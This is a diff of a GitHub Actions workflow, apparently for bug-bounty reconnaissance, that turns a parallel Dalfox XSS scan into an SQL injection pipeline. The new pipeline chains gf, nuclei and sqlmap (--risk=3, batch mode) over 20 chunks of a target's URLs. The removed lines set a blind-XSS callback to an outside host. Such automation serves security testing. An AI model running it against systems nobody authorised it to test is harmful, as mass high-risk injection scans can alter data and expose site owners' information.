@@ -1,4 +1,4 @@
-name: "Dalfox XSS Scanner (Parallel)"
+name: "SQL Injection Scanner Workflow"
 
 on:
   workflow_dispatch:
@@ -48,10 +48,10 @@ jobs:
       - name: Upload combined results artifact
         uses: actions/upload-artifact@v4
         with:
-          name: dalfox-combined-results-artifact
+          name: combined-results-artifact
           path: combined-results/
 
-  dalfox-scan:
+  sqli-scan:
     needs: fetch-results
     if: "needs.fetch-results.outputs.urls_exist == 'true'"
     runs-on: ubuntu-latest
@@ -59,19 +59,22 @@ jobs:
       matrix:
         chunk: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     steps:
-      - name: Checkout main branch
-        uses: actions/checkout@v3
       - name: Download artifacts
         uses: actions/download-artifact@v4
         with:
-          name: dalfox-combined-results-artifact
+          name: combined-results-artifact
           path: combined-results/
-      - name: Setup Go
-        uses: actions/setup-go@v3
-        with:
-          go-version: '1.23'
-      - name: Install Dalfox
-        run: go install github.com/hahwul/dalfox/v2@latest
+      - name: Install dependencies
+        run: |
+          sudo apt-get update && sudo apt-get install -y sqlmap
+          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          go install github.com/tomnomnom/gf@latest
+          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+      - name: Install Gf patterns
+        run: |
+          git clone https://github.com/1ndianl33t/Gf-Patterns.git
+          mkdir -p ~/.gf
+          cp Gf-Patterns/*.json ~/.gf/
       - name: Generate URL chunk file
         run: |
           if [ -s combined-results/live-urls.txt ]; then
@@ -79,48 +82,54 @@ jobs:
             LINES_PER_CHUNK=$(( (TOTAL_LINES + 20 - 1) / 20 ))
             START_LINE=$((((${{ matrix.chunk }} - 1) * LINES_PER_CHUNK) + 1))
             END_LINE=$((${{ matrix.chunk }} * LINES_PER_CHUNK))
-            sed -n "${START_LINE},${END_LINE}p" combined-results/live-urls.txt > dalfox-chunk-${{ matrix.chunk }}.txt
+            sed -n "${START_LINE},${END_LINE}p" combined-results/live-urls.txt > sqli-chunk-${{ matrix.chunk }}.txt
           else
-            touch dalfox-chunk-${{ matrix.chunk }}.txt
+            touch sqli-chunk-${{ matrix.chunk }}.txt
           fi
-      - name: Run Dalfox Scan on Chunk
+      - name: Filter URLs with GF and Nuclei
         run: |
-          set -e
-          INPUT_FILE="dalfox-chunk-${{ matrix.chunk }}.txt"
-          OUTPUT_FILE="dalfox-output-${{ matrix.chunk }}.txt"
-          PAYLOAD_FILE="dalfox_payload.txt" # This file should exist in the repo
-          BLIND_XSS_URL="https://1.bigdav.ir/dalfox-${{ github.event.inputs.target_name }}"
+          INPUT_FILE="sqli-chunk-${{ matrix.chunk }}.txt"
+          GF_OUTPUT="potential-sqli-gf.txt"
+          NUCLEI_OUTPUT="potential-sqli-nuclei.txt"
+          FINAL_LIST="final-sqli-candidates.txt"
 
-          if [ ! -s "$INPUT_FILE" ]; then
-            echo "URL chunk file is empty, skipping Dalfox scan for this chunk."
-            touch "$OUTPUT_FILE"
-            exit 0
+          # Use gf to find URLs with patterns that suggest SQLi
+          if [[ -s "$INPUT_FILE" ]]; then
+            gf sqli "$INPUT_FILE" > "$GF_OUTPUT"
+          else
+            touch "$GF_OUTPUT"
           fi
 
-          # Build header arguments
-          HEADER_ARGS=()
-          if [[ -n "${{ github.event.inputs.custom_cookie }}" ]]; then
-            HEADER_ARGS+=(-H "Cookie: ${{ github.event.inputs.custom_cookie }}")
-          fi
-          if [[ -n "${{ github.event.inputs.custom_header }}" ]]; then
-            HEADER_ARGS+=(-H "${{ github.event.inputs.custom_header }}")
+          # Use nuclei with SQLi templates to find vulnerable URLs
+          if [[ -s "$INPUT_FILE" ]]; then
+            nuclei -l "$INPUT_FILE" -t "vulnerabilities/sql-injection" -o "$NUCLEI_OUTPUT"
+          else
+            touch "$NUCLEI_OUTPUT"
           fi
 
-          $HOME/go/bin/dalfox file "$INPUT_FILE" \
-            --custom-payload "$PAYLOAD_FILE" \
-            -b "$BLIND_XSS_URL" \
-            --silence \
-            --skip-headless \
-            -o "$OUTPUT_FILE" \
-            "${HEADER_ARGS[@]}"
-      - name: Upload Dalfox results artifact
+          # Combine and deduplicate the results
+          cat "$GF_OUTPUT" >> "$FINAL_LIST"
+          # Extract URLs from nuclei output (format: [template-id] [protocol]://host... [matcher-status])
+          grep -oP 'https?://\S+' "$NUCLEI_OUTPUT" >> "$FINAL_LIST"
+          sort -u -o "$FINAL_LIST" "$FINAL_LIST"
+      - name: Run SQLMap on filtered URLs
+        run: |
+          mkdir -p sqli-results-${{ matrix.chunk }}
+          INPUT_FILE="final-sqli-candidates.txt"
+          if [[ -s "$INPUT_FILE" ]]; then
+            sqlmap -m "$INPUT_FILE" --batch --random-agent --level=3 --risk=3 --output-dir="sqli-results-${{ matrix.chunk }}"
+          else
+            echo "No potential SQLi candidates found to scan."
+            touch "sqli-results-${{ matrix.chunk }}/sqlmap.log"
+          fi
+      - name: Upload SQLi results artifact
         uses: actions/upload-artifact@v4
         with:
-          name: dalfox-results-chunk-${{ matrix.chunk }}
-          path: dalfox-output-${{ matrix.chunk }}.txt
+          name: sqli-results-chunk-${{ matrix.chunk }}
+          path: sqli-results-${{ matrix.chunk }}/
 
   push-to-storage:
-    needs: [dalfox-scan]
+    needs: [sqli-scan]
     if: always()
     runs-on: ubuntu-latest
     steps:
@@ -141,17 +150,21 @@ jobs:
       - name: Push results to storage repo
         run: |
           git clone ${{ github.event.inputs.storage_repo }} storage
-          mkdir -p storage/${{ github.event.inputs.target_name }}/xss
+          mkdir -p storage/${{ github.event.inputs.target_name }}/sqli
 
-          DALFOX_FILE="storage/${{ github.event.inputs.target_name }}/xss/dalfox.txt"
+          RESULTS_DIR="storage/${{ github.event.inputs.target_name }}/sqli"
 
-          # Consolidate all dalfox output into a single file
-          find all-results -type f -name "dalfox-output-*.txt" -exec cat {} + > "$DALFOX_FILE"
+          # Consolidate all sqlmap output into a single directory
+          find all-results -type d -name "sqli-results-chunk-*" | while read -r chunk_dir; do
+            if [ -d "$chunk_dir" ]; then
+              cp -r "$chunk_dir"/* "$RESULTS_DIR/"
+            fi
+          done
 
           cd storage
           git add .
           if ! git diff --staged --quiet; then
-            git commit -m "Add parallel Dalfox scan results for ${{ github.event.inputs.target_name }}"
+            git commit -m "Add SQLi results for ${{ github.event.inputs.target_name }}"
             git push
           else
             echo "No changes to commit"
